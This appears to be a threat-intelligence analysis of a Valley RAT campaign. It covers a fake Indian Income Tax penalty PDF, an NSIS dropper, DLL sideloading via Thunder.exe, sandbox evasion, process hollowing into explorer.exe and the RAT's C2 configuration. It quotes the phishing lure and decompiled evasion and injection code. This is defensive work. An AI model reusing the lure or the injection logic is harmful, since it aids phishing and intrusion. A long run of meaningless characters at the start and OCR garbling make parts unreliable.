/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/\n  \n\nMalicious email  \n\nWe found an interesting email uploaded from India with just an attachment called \"TOPsoE India Private Limited\". The pdf looked like an official Income Tax Department document. Upon clicking on the pdf, \"ggwk[.]cc\" opens up on the browser and a zip file called \"tax affairs.exe\" is downloaded.\n\n<--- Page Split --->\n\nNo. TAX/PEN/2025-142 \n\nभारत सरकार / Government of India\nवित्त मंत्रालय / Ministry of Finance\nआयकर विभाग / Income Tax Department\nप्रवर्तन प्रभाग / Enforcement Division \n\nAayakar Bhavan,\nNew Delhi - 110001 \n\nOFFICE MEMORANDUM \n\nSub: कर अनुपालन की कमी और दंड सूचना / Tax Compliance Deficiency and Penalty Notice \n\n1. आपकी कमनी की कर निरीक्षण के दौरान आयकर अधिनियम, 1961 की धारा 271(1)(c) के तहत कर संबंधी अनियमिताएं पाई गई हैं। The tax inspection of your company has revealed irregularities under Section 271(1)(c) of the Income Tax Act, 1961. \n\n2. इस सूचना की प्राप्ति के 72 घंटे (3 दिन) के भीतर निम्नलिखित दस्तावेज आयकर विभाग को प्रस्तुत करना अनिवार्य है। It is mandatory to submit the following documents to the Income Tax Department within 72 hours (3 days) of receipt of this notice. \n\nआवश्यक दस्तावेज सूची / Required Documents List\nनीचे दिए गए लिंक से दस्तावेज डाउनलोड करें / Download documents from the link below \n\nदस्तावेज डाउनलोड करें / Download Documents \n\n3. निर्धारित समयावधि में दस्तावेज प्रस्तुत न करने पर आयकर अधिनियम की धारा 276C के तहत कानूनी कार्रवाई की जाएगी। Legal action will be taken under Section 276C of the Income Tax Act if documents are not submitted within the stipulated time. \n\n(राज कुमार शर्मा) \n\nRaj Kumar Sharma \n\nसहायक आयकर आयुक्त \n\nAssistant Commissioner of Income Tax \n\nTechnical Analysis \n\nStage - 1: Tax Affairs.zip \n\nPE32 \n\nOperation system: Windows(2000)[1386, 32-bit, GUI] \n\nLinker: Microsoft Linker(10.00.40219) \n\nCompiler: Microsoft Visual C/C++(16.00.40219)[C] \n\nLanguage: C \n\nTool: Visual Studio(2010) \n\n(Heur) Packer: Compressed or packed data[Strange overlay] \n\nInstaller: Nullsoft Scriptable Install System(2.46.5-ANSI) \n\nOverlay: Binary[Offset=0x00034c00,Size=0x002a2e40] \n\nUnknown: Unknown \n\nDetect It Easy \n\nUsing static analysis we see that the given PE file is a 32 bit GUI binary. More importantly, the file is identified as a Nullsoft Scriptable Install system (NSIS) installer. NSIS installers embed their installation script, compressed payloads etc inside the binary itself and we can move ahead to analyse it as an installer driven staging payload.\n\n<--- Page Split --->\nGetTempPathA(0x10000u, PathName); \n\nif ( sub_4032CB() || (GetWindowsDirectoryA(PathName, 0xFFBu), lstrcatA(PathName, \"\\Temp\"), sub_4032CB()) \n\nDeleteFileA(FileName); \n\nError_writing_temporary_file._Make_sure_your_temp_folder_is_val = (const char *)sub_403030(Buffer); \n\nif (!Error_writing_temporary_file._Make_sure_your_temp_folder_is_val ) \n\nif (!dword_433C24 ) \n\n{ \n\nABEL_34: \n\nuExitCode = -1; \n\nuExitCode = sub_4052E6(); \n\ngoto LABEL_35; \n\n} \n\nfor ( i = (CHAR *)sub_40567B(&sz, 0); i >= &sz && sub_4032FF(i, \"_=\", 4); --i ) \n\n; \n\nError_writing_temporary_file._Make_sure_your_temp_folder_is_val = \"Error launching installer\"; \n\nif ( i >= &sz ) \n\n{ \n\n* i = 0; \n\nlpString2_3 = i + 4; \n\nif ( !sub_405EFC(lpString2_3) ) \n\ngoto LABEL_35; \n\nlstrcpyAn_wrp(&lpString1_, lpString2_3); \n\nlstrcpyAn_wrp(Directory, lpString2_3); \n\nError_writing_temporary_file._Make_sure_your_temp_folder_is_val = 0; \n\ngoto LABEL_34; \n\n} \n\nlstrcatA(PathName, \"\\nsu.tmp\"); \n\nif ( lstrcmpiA(PathName, ::lpString2) ) \n\n{ \n\nCreateDirectoryA(PathName, 0); \n\nSetCurrentDirectoryA(PathName); \n\nif ( !lpString1_ ) \n\nlstrcpyAn_wrp(&lpString1_, ::lpString2); \n\nlstrcpyAn_wrp(lpString1_, lpString2); \n\nlstrcpyAn_wrp(&lpString1_0, \"A\"); \n\nn26 = 26;<｜end▁of▁sentence｜>\n\n<center>NSIS Installer </center>  \n\nThe NSIS installer begins by resolving a writable temporary directory using GetTempPathA. If the operation fails, it falls back to C:\\Windows\\Temp, ensuring execution reliability. Once a valid location is identified, the installer creates an NSIS specific working directory (\\~nsu.tmp) and switches the directory to it.  \n\nDropped Files   \n\n<table><tr><td>ndoe &amp;gt; AppData &amp;gt; Local &amp;gt; Temp</td><td></td><td></td><td></td></tr><tr><td>Name</td><td>Date modified</td><td>Type</td><td>Size</td></tr><tr><td>Thunder.exe</td><td>7/24/2024 10:42 PM</td><td>Application</td><td>635 KB</td></tr><tr><td>FastAnimation.dll</td><td>5/27/2025 4:38 AM</td><td>Application extens...</td><td>578 KB</td></tr><tr><td>leakrepair.dll</td><td>5/27/2025 4:40 AM</td><td>Application extens...</td><td>716 KB</td></tr><tr><td>dynlbase.dll</td><td>5/27/2025 4:48 AM</td><td>Application extens...</td><td>1,431 KB</td></tr><tr><td>libaw.dat</td><td>5/27/2025 4:59 AM</td><td>DAT File</td><td>1,121 KB</td></tr><tr><td>DumpUper.ini</td><td>5/27/2025 5:01 AM</td><td>Configuration setti...</td><td>2 KB</td></tr><tr><td>libdefa.dat</td><td>9/16/2025 7:38 AM</td><td>DAT File</td><td>321 KB</td></tr><tr><td>box.ini</td><td>9/25/2025 8:00 PM</td><td>Configuration setti...</td><td>126 KB</td></tr><tr><td>libexpat.dll</td><td>9/25/2025 8:13 PM</td><td>Application extens...</td><td>32 KB</td></tr></table>  \n\nUpon analysis we found that only 2 files are of use to us, Thunder.exe and libexpat.dll. Thunder.exe is a legitimate, digitally signed executable developed by Xunlei (迅雷), commonly distributed as part of the Thunder download manager ecosystem. In this infection chain, the binary itself is not malicious but is abused as a DLL hijacking host. When executed from installer's temporary directory, Thunder.exe loads libexpat.dll from its local path due to default DLL search order. We can confirm this in x64dbg.\n\n<--- Page Split --->\npos: 0%\n\npush eax\n\njmp tax affairs.402008\n\npush F\n\ncall tax affairs.405A65\n\npush 64\n\npush dword ptr ss:[ebp+8]\n\ncall esi\n\ncmp eax,102\n\nje tax affairs.401FFC\n\nlea eax,dword ptr ss:[ebp-8]\n\npush eax\n\npush dword ptr ss:[ebp+8]\n\ncall dword ptr ds:[<GetExitCodeProcess>]\n\ncmp dword ptr ss:[ebp-20],ebx\n\njl tax affairs.40202E\n\npush dword ptr ss:[ebp-8]\n\npush edi\n\ncall tax affairs.40589E\n\njmp tax affairs.40203A\n\ncmp dword ptr ss:[ebp-8],ebx\n\nje tax affairs.40203A\n\nmov dword ptr ss:[ebp-4],1\n\npush dword ptr ss:[ebp+8]<｜end▁of▁sentence｜>\n\n<center>DLL Loading </center>  \n\n## Stage - 2 : libexpat.dll  \n\nThe dropped libexpat.dll does not export any meaningful functions and is never explicitly invoked by Thunder.exe.The dll relies on the windows loader functionality and calls the DLLMain. This callback is invoked unconditionally, regardless of whether the DLL exports any functions or is actively used by the host process.  \n\nLet's take a look at the working of the DLL.  \n\nv4 = IsDebuggerPresent(); \n\nv5 = &unk_100056DC; \n\nif (!v4) \n\nv5 = &unk_100056E4; \n\nLogStatus((char *)&Format_1, v5); \n\nif (v4) \n\n{ \n\nLogStatus((char *)&Format_2); \n\nreturn 0; \n\n} \n\nelse if (CheckSystemResources()) \n\nGetSystemInfo(&SystemInfo); \n\ndwNumberOfProcessors = SystemInfo.dwNumberOfProcessors; \n\nv7 = &unk_1000560C; \n\nif ( SystemInfo.dwNumberOfProcessors < 4 ) \n\nv7 = &unk_10005614; \n\nLogStatus(aCpu, SystemInfo.dwNumberOfProcessors, v7); \n\nif ( dwNumberOfProcessors >= 4 ) \n\n{ \n\nif (!(unsigned __int8)Persistence()) \n\nLogStatus((char *)&Format_3); \n\nToolHelp32Snapshot = CreateToolhelp32Snapshot(2u, 0); \n\nif ( ToolHelp32Snapshot != (HANDLE)-1 ) \n\n{ \n\npe.dwSize = 556; \n\nif ( Process32Firstw(Toolhelp32Snapshot, &pe) ) \n\n{ \n\ndo \n\n{ \n\nv9 = wcscmp(pe.szExeFile, L\"ida.exe\"); \n\nif ( v9 ) \n\nv9 = v9 < 0 ? -1 : 1; \n\nif (!v9 ) \n\nLogStatus((char *)&Format_4, pe.th32ProcessID); \n\nv10 = wcscmp(pe.szExeFile, L\"x64dbg.exe\"); \n\nif ( v10 ) \n\nv10 = v10 < 0 ? -1 : 1; \n\nif (!v10 ) \n\nLogStatus((char *)&Format_5, pe.th32ProcessID); \n\n} \n\nwhile ( Process32Nextw(Toolhelp32Snapshot, &pe) );<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\n\nThe Main function begins by many anti debugging and sandbox techniques.The DLL performs process enumeration and scans the process list for common analysis and sandbox tools. Also the DLL queries for the system resources checking if minimum requirements are satisfied or not. In addition to that, if it detects any sandbox environment, it terminates the malware.  \n\nif (!DisableWindowsUpdateService() ) \n\nLogStatus((char *)&Format_6); \n\nBlock[0] = 0; \n\nBlock[1] = 0; \n\nv17 = 0; \n\nv18 = 0; \n\nif ( LoadAndDecryptPayload(Block) ) \n\nv11 = ProcessHollowing((int)Block); \n\nFormat = (char *)&unk_100059C0; \n\nif ( v11 ) \n\nFormat = (char *)&byte_100059CC; \n\n} \n\nelse \n\n} \n\nFormat = (char *)&unk_100059E0; \n\n} \n\nLogStatus(Format); \n\nDisableThreadLibraryCalls(hinstDLL); \n\nCreateThread(0, 0, StartAddress, 0, 0, 0); \n\nv13 = Block[0]; \n\nif ( Block[0] ) \n\n} \n\nif ( v17 - (unsigned int)Block[0] >= 0x1000 ) \n\nv13 = (void *)*((_DWORD *)Block[0] - 1); \n\nif ( (unsigned int)((char *)Block[0] - (char *)v13 - 4) > 0x1F ) \n\ninvalid_parameter_noinfo_noreturn(); \n\n} \n\nsub_10003E6E(v13);<｜end▁of▁sentence｜>\n\n<center>Payload Decryption </center>  \n\nOnce the DLL completes its anti analysis checks, it enters the core execution logic. It first disables the Windows Update service(wuauserv) then loads an encrypted payload from the disk. The payload is dynamically resolved and loads the box.ini file from the temporary directory. The file is fully read into memory, decrypted using embedded cryptographic constants and later on executed as shellcode.  \n\n<table><tr><td>00</td><td>01</td><td>02</td><td>03</td><td>04</td><td>05</td><td>06</td><td>07</td><td>08</td><td>09</td><td>OA</td><td>OB</td><td>OC</td><td>OD</td><td>OE</td><td>OF</td></tr><tr><td>9B</td><td>80</td><td>9D</td><td>8E</td><td>89</td><td>C3</td><td>23</td><td>6B</td><td>A6</td><td>95</td><td>C5</td><td>FC</td><td>B7</td><td>2A</td><td>CB</td><td>OD</td></tr><tr><td>D4</td><td>CF</td><td>6B</td><td>FF</td><td>F8</td><td>6F</td><td>AC</td><td>9C</td><td>D8</td><td>94</td><td>6A</td><td>50</td><td>32</td><td>F0</td><td>B1</td><td>FC</td></tr><tr><td>E1</td><td>29</td><td>25</td><td>0D</td><td>5A</td><td>2A</td><td>E7</td><td>A3</td><td>4C</td><td>7B</td><td>54</td><td>A1</td><td>F7</td><td>2B</td><td>4E</td><td>60</td></tr><tr><td>14</td><td>CF</td><td>71</td><td>43</td><td>65</td><td>4B</td><td>B3</td><td>12</td><td>80</td><td>73</td><td>54</td><td>F5</td><td>A4</td><td>0B</td><td>ED</td><td>71</td></tr><tr><td>A6</td><td>6B</td><td>6B</td><td>5C</td><td>0D</td><td>6F</td><td>57</td><td>F0</td><td>F8</td><td>C3</td><td>F6</td><td>15</td><td>F2</td><td>8F</td><td>81</td><td>EB</td></tr><tr><td>6C</td><td>18</td><td>A0</td><td>F4</td><td>DB</td><td>9F</td><td>47</td><td>00</td><td>8C</td><td>A7</td><td>CE</td><td>0E</td><td>EB</td><td>92</td><td>CF</td><td>89</td></tr><tr><td>83</td><td>87</td><td>D0</td><td>70</td><td>D4</td><td>C9</td><td>42</td><td>64</td><td>BF</td><td>78</td><td>8D</td><td>C5</td><td>84</td><td>93</td><td>9B</td><td>90</td></tr><tr><td>74</td><td>BA</td><td>DE</td><td>B5</td><td>E8</td><td>A1</td><td>86</td><td>44</td><td>CC</td><td>AD</td><td>C3</td><td>C0</td><td>7C</td><td>A1</td><td>94</td><td>6F</td></tr><tr><td>54</td><td>62</td><td>72</td><td>F8</td><td>9F</td><td>6F</td><td>C4</td><td>R9</td><td>07</td><td>19</td><td>1D</td><td>F7</td><td>6F</td><td>17</td><td>DN</td><td>8F</td></tr></table>\n\nDecoded text \n\n\"E.ZNA#k!·Aü·*E.\nÖİkyoo-oeo\"jP2&tü\ná)%.Z*ç£L(Tj÷+N'\n.İqCeK°.eStÖn.iq\n!kk\\.ow&oAö.ö..ë\n1. öÜYG.ÇSİ.ë'İn\nf#DpÖÉBdžx.Ä„“>.\nt°Pue;tDİ.ÄÄ|;\"o\nThræšnÄi...-n.ÝÝ<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\nStartupInfo.dwFlags = STARTF_USESHOWWINDOW; \n\nmemset(&StartupInfo.wShowWindow, 0, 20); \n\nif ( GetFileAttributesA(\"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\") == -1 ) \n\nLastError = GetLastError(); \n\nLogStatus((char *)&Format_17, \"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\", LastError); return 0; \n\nif (!CreateProcessA( \n\n\"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\", \n\n0, \n\n0, \n\n0, \n\n0, \n\nCREATE_SUSPENDED | CREATE_NO_WINDOW, \n\n0, \n\n0, \n\n&StartupInfo, \n\n&ProcessInformation) ) \n\n{ \n\nerr = GetLastError(); \n\nLogStatus((char *)&Format_18, err, \"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\"); return 0; \n\nLogStatus((char *)&Format_19, ProcessInformation.dwProcessId, ProcessInformation.dwThreadId); Context.ContextFlags = 65543; \n\nif (!GetThreadContext(ProcessInformation.hThread, &Context) ) \n\nerr_1 = GetLastError(); \n\nLogStatus((char *)&Format_20, err_1); \n\nLABEL_7: \n\nCloseHandle(ProcessInformation.hThread); \n\nCloseHandle(ProcessInformation.hProcess);<｜end▁of▁sentence｜>\n\n<center>Process Injection </center>  \n\nThe shellcode is executed using a classic technique called Process Injection. The routine begins by verifying the presence of explorer.exe, which is later used as the target process. The binary is launched in suspended state and the malware retrieves the initial thread context. Further it allocates executable memory inside the remote process via VirtualAllocEx and writes the payload via WriteProcessMemory.  \n\nerrno_t LogStatus(char *Format, ...) \n\nerrno_t result; // eax \n\nint v2; // ecx \n\nsigned int Size; // kr00_4 \n\nvoid *Buffer_3; // edi \n\nsigned int i; // edx \n\nFILE *Stream; // [esp+Ch] [ebp-880h] BYREF \n\n_SYSTEMTIME SystemTime; // [esp+10h] [ebp-87Ch] BYREF \n\nchar Buffer[1024]; // [esp+20h] [ebp-86Ch] BYREF \n\nchar Buffer_2[1092]; // [esp+420h] [ebp-46Ch] BYREF \n\nchar Buffer_1[32]; // [esp+864h] [ebp-28h] BYREF \n\nva_list ArgList; // [esp+898h] [ebp+Ch] BYREF \n\nva_start(ArgList, Format); \n\nStream = 0; \n\nresult = fopen_s(&Stream, \"C:\\\\data.db\", \"ab+\"); \n\nif (!result && Stream) \n\nGetLocalTime(&SystemTime); \n\nsub_10003860(Buffer_1, \"[%04d-%02d-%02d %02d:%02d:%02d]\", SystemTime.wYear); \n\nsub_10001050(Buffer, v2, Format, v2, ArgList); \n\nsub_10003880(Buffer_2, \"%s%s\\n\", (char)Buffer_1); \n\nSize = strlen(Buffer_2); \n\nBuffer_3 = malloc(Size); \n\nif ( Buffer_3 ) \n\nmemcpy(Buffer_3, Buffer_2, Size); \n\nfor ( i = 0; i < Size; ++i ) \n\n*((_BYTE *)Buffer_3 + i) = 89 - (byte_10005A84[i & 7] ^ _ROL1_(*((_BYTE *)Buffer_3 + i), 2)); \n\nfwrite(Buffer_3, 1u, Size, Stream); \n\nfree(Buffer_3);<｜end▁of▁sentence｜>\n  \n\nThe LogStatus function implements an internal logging mechanism used throughout the DLL to record execution progress and error states. The function formats a timestamped log message, appends it to a local file (C:\\data.db), and applies a lightweight custom obfuscation before writing it to disk.\n\n<--- Page Split --->\n<｜end▁of▁sentence｜>\n\n<center>Encrypted Payload in memory </center>  \n\nThe injected payload can be dumped by attaching a debugger to the hollowed explorer.exe process and monitoring the memory region allocated via VirtualAllocEx. Once the payload is written using WriteProcessMemory and execution is redirected, the allocated region can be dumped directly from memory, yielding the next stage payload for analysis.  \n\nE8 C0 C9 01 00 C0 C9 01 00 33 56 67 6A 66 95 EE 1AE..AE..3Vgif+1 87 5C F8 F3 F1 E1 9C 4D FE B8 FB 9E ED 69 D4 A2 +o6n6a0p,u- ii0c AF 92 B5 95 6C 05 E4 4C CF 00 00 00 00 OA 61 C2 \"u1.aII...aA E4 7A BA 59 20 00 CC 85 43 9D 07 BD 84 A1 72 64 azY..I..C..s,ird 87 8D F5 7D 2F 8B 4F BA 65 62 C1 4C 81 4C 42 AD +.6/0eBAL.LB. 4E CE 6F 33 67 E3 86 63 6B 37 39 8E 74 EA 1F 89 Nf03g4tck79Zte.k D1 AA 05 F0 14 E3 29 7E D7 19 CB 5E C3 96 14 6B N*.6.a)~x.E^A-k 9F 2F 0A 75 3C EF 0A EA 05 F8 1E 07 AD D0 81 6E Y/.uc1.e..D.n B8 2E F2 31 BF F5 FB 33 45 B8 7C 16 71 B6 40 D3 .0lz0u3E,1.qf0 70 68 0F B6 38 B9 33 F4 AE F4 60 6A 34 33 D3 4C ph.f8+3o0'j43OL CE 2E F9 08 0F F0 4C 2C E0 0C A7 EB F9 77 6D B5 I.u..6L,a.5eWmu 8F 96 C2 C9 18 01 63 E8 64 5A B4 CE E8 8E 14 BF -AE..cedz'feZ.z 85 BE FB CE F5 37 55 18 A3 FA 31 B2 7E 81 36 39 .n6f7U.fu1~.69 9A 70 DF 6E 59 F3 C2 63 78 81 48 51 DA 01 88 26 apBnY6Acx.HQU.^ 6A 15 E3 36 BA B2 CC 05 D1 63 F5 7A 1B DC D4 8F .6e+1.Nc0z.u0. 15 17 C8 B6 D7 06 8D 05 40 8A A5 38 38 D4 03 B7 .Ef..d5f80. BC AA AE D5 DF BF 0D 5A 14 EB E2 FB 2A 2D 03 16 +o0z.z.eaU~.  \n\nLooking through the decrypted payload we find that the final payload is a Donut generated shellcode. In this setup, Donut is used to wrap a managed payload into raw shellcode, allowing it to be executed entirely from memory without touching disk.  \n\nBinary \n\nShellcode: Donut(0.9.2)[x86] \n\nS ?<｜end▁of▁sentence｜>\n  \n\nWe can dump the Donut payload by using tools like undonut or donut- decryptor.  \n\n## Stage - 4 : Valley RAT  \n\nAfter the Donut loader successfully injects the final payload into the hollowed explorer.exe process, Valley RAT initializes its sophisticated configuration management subsystem. It starts off by setting anti analysis procedures and then invokes a function sub_405E40() to initialize it's configuration and later create a thread for C2 communication.\n\n<--- Page Split --->\nif (!byte_41DA8C ) \n\n{\n\nbyte_41DA8C = 1;\n\n_wcsrev(a0Db1k1Hs0ld0L);\n\nmemset(&src, 0, 0x12A0u);\n\nsub_405D70('L\"p1:\", Source, 0);\n\nsub_405D70('L\"o1:\", Source_2, 0);\n\nsub_405D70('L\"t1:\", 0, (int)&dword_41CA30);\n\nsub_405D70('L\"p2:\", Source_0, 0);\n\nsub_405D70('L\"o2:\", Source_1, 0);\n\nsub_405D70('L\"t2:\", 0, (int)&dword_41CC70);\n\nsub_405D70('L\"p3:\", Source_3, 0);\n\nsub_405D70('L\"o3:\", Source_4, 0);\n\nsub_405D70('L\"t3:\", 0, (int)&dword_41CE80);\n\nsub_405D70('L\"dd:\", word_41CEF0, 0);\n\nsub_405D70('L\"cl:\", word_41CF2C, 0);\n\nsub_405D70('L\"bb:\", &word_41CF4, 0);\n\nsub_405D70('L\"bb:\", &word_41CFF4, 0);\n\nsub_405D70('L\"jp:\", 0, (int)&unk_41D058);\n\nsub_405D70('L\"sx:\", 0, (int)&unk_41D05C);\n\nsub_405D70('L\"bh:\", 0, (int)&unk_41D060);\n\nsub_405D70('L\"ll:\", 0, (int)&unk_41D064);\n\nsub_405D70('L\"dl:\", 0, (int)&unk_41D06C);\n\nsub_405D70('L\"bd:\", 0, (int)&unk_41D074);\n\n//\"|0:db|1:1k|1:hs|0:1d|0:11|0:hb|1:pj|52.9 .5202:zb|0.1:bb|\"\n\n**Primary C2**\n\n**Tertiary C2**\n\n**Delay**\n\n**Interval**\n\n**Build Version**\n\n**Download**\n\n**Shell**\n\n**Keylogger**\n\n**Backdoor**<｜end▁of▁sentence｜>\n\n<center>C2 Configuration </center>  \n\nThe function implements a two stage loading mechanism. It extracts 22 distinct configuration parameters through a parsing function.  \n\n## Stage 1  \n\n## Command & Control Infrastructure (9 parameters):  \n\n- p1:, p2:, p3: - Three-tier C2 server addresses (correlates with b[.]yuxuanow[.]top identified in network analysis)- o1:, o2:, o3: - Corresponding port numbers for each C2 tier- t1:, t2:, t3: - Connection type flags (1 = HTTP/HTTPS, 0 = raw 